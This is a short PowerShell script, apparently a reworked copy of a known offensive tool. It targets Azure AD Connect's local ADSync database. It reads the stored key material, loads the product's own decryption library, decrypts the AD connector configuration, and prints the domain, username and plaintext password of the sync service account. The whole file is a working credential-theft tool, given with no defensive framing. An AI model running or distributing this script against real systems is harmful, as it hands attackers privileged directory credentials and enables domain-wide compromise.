#Reconfigured By Tuzz.

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"


try {
    $client.Open()
} catch {
    Write-Host "[!] Could not connect to localdb..."
    return
}

Write-Host "[*] Querying ADSync localdb (mms_server_configuration)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_server_configuration"
    return
}

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

Write-Host "[*] Querying ADSync localdb (mms_management_agent)"

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_management_agent"
    return
}

$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path "C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll"
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] Credentials incoming...`n"

Write-Host "Domain: $($domain.Domain)"
Write-Host "Username: $($username.Username)"
Write-Host "Password: $($password.Password)"
